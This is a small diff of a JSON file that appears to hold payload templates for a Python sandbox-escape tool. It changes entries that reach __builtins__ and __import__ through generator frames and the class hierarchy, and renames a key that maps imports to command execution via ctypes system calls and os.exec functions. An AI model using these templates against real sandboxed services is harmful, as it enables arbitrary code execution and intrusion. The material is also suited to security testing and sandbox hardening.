@@ -107,8 +107,8 @@
         ["GENERATOR.f_globals['__builtins__']", ""]
     ],
     "import": [
-        ["GENERATOR.['__builtins__'].__import__", ""],
-        ["GENERATOR.['__loader__'].load_module", ""],
+        ["GENERATOR['__builtins__'].__import__", ""],
+        ["GENERATOR['__loader__'].load_module", ""],
         ["__import__", "__import__"],
         ["__loader__.load_module", "__loader__"],
         ["BUILTINS_SET['__import__']", "BUILTINS_SET"],
@@ -141,7 +141,7 @@
         ["BUILTINOBJ.__class__.__mro__[-1]", ""],
         ["BUILTINOBJ.__class__.__mro__[1]", ""]
     ],
-    "import2RCE":[
+    "__import__2RCE":[
         ["ctypes.CDLL(None).system(CMD.encode())", "ctypes"],
         ["os.execl(CMD_FILE, UNFOLD_CMD_ARGS)", "os"],
         ["os.execle(CMD_FILE, UNFOLD_CMD_ARGS)", "os"],
